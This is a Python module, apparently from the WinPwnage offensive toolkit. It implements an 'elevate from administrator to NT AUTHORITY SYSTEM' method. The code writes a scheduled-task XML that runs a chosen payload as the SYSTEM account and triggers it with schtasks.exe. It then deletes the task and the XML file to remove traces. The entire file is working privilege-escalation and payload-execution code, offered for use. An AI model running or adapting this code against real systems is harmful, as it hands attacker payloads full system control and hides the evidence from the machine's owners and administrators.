from winpwnage.core.prints import *
from winpwnage.core.utils import *
import datetime
import tempfile
import time
import os

elevateMethod4_info = {
	"Description": "Elevate from administrator to NT AUTHORITY SYSTEM using schtasks.exe (non interactive)",
	"Method": "Malicious scheduled task that gets deleted once used",
	"Id": "4",
	"Type": "Elevation",
	"Fixed In": "99999" if information().admin() == True else "0",
	"Works From": "7600",
	"Admin": True,
	"Function Name": "elevateMethod4",
	"Function Payload": True,
}

def elevateMethod4(payload):
	if not information().admin():
		print_error("Cannot proceed, we are not elevated")
		return False
		
	if payloads().exe(payload):
		xml_template = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
	<RegistrationInfo>
		<Date>{date}</Date>
		<URI>\\Microsoft\\Windows\\elevator</URI>
	</RegistrationInfo>
	<Triggers>
		<LogonTrigger>
			<Enabled>true</Enabled>
		</LogonTrigger>
	</Triggers>
	<Principals>
		<Principal id="Author">
			<UserId>S-1-5-18</UserId>
			<RunLevel>HighestAvailable</RunLevel>
		</Principal>
	</Principals>
	<Settings>
		<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
		<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
		<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
		<AllowHardTerminate>false</AllowHardTerminate>
		<StartWhenAvailable>true</StartWhenAvailable>
		<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
		<IdleSettings>
			<StopOnIdleEnd>true</StopOnIdleEnd>
			<RestartOnIdle>false</RestartOnIdle>
		</IdleSettings>
		<AllowStartOnDemand>true</AllowStartOnDemand>
		<Enabled>true</Enabled>
		<Hidden>false</Hidden>
		<RunOnlyIfIdle>false</RunOnlyIfIdle>
		<WakeToRun>false</WakeToRun>
		<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
		<Priority>7</Priority>
		<RestartOnFailure>
			<Interval>PT2H</Interval>
			<Count>999</Count>
		</RestartOnFailure>
	</Settings>
	<Actions Context="Author">
		<Exec>
			<Command>"{payload}"</Command>
		</Exec>
	</Actions>
</Task>""".format(date=str(datetime.datetime.now()).replace(' ', 'T'), payload=payloads().exe(payload)[1])

		try:
			xml_file = open(os.path.join(tempfile.gettempdir(), "elevator.xml"), "w")
			xml_file.write(xml_template)
			xml_file.close()
		except Exception as error:
			return False

		time.sleep(5)

		if os.path.isfile(os.path.join(tempfile.gettempdir(), "elevator.xml")):
			if process().create("schtasks.exe",params="/create /xml {path} /tn elevator".format(path=os.path.join(tempfile.gettempdir(), "elevator.xml"))):
				print_success("Successfully created scheduled task")
			else:
				print_error("Unable to create scheduled task")
				return False

			time.sleep(5)

			if process().create("schtasks.exe",params="/run /tn elevator"):
				print_success("Successfully ran scheduled task")
			else:
				print_error("Unable to run scheduled task")
				return False

			time.sleep(5)

			print_info("Performing cleanup")
			if process().create("schtasks.exe",params="/delete /tn elevator"):
				print_success("Successfully deleted scheduled task")
			else:
				print_error("Unable to delete scheduled task")
				return False

			try:
				os.remove(os.path.join(tempfile.gettempdir(), "elevator.xml"))
			except Exception as error:
				return False
			else:
				print_success("Successfully deleted xml file")
		else:
			print_error("Unable to create scheduled task, xml file not found")
			return False
	else:
		print_error("Cannot proceed, invalid payload")
		return False			